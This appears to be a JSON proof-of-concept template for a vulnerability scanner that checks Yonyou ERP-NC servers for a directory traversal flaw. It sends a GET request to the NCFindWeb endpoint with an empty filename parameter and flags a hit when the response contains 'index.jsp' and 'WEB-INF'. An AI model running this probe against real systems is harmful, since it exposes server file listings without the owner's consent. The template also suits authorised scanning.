{
    "Name": "用友ERP-NC目录遍历漏洞",
    "Description": "用友ERP-NC目录遍历漏洞",
    "Product": "用友",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/NCFindWeb?service=IPreAlertConfigService&filename=",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "index.jsp"
                },
                {
                 "Operation": "contains", 
                 "Key":"",
                 "Value": "WEB-INF"
                 },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}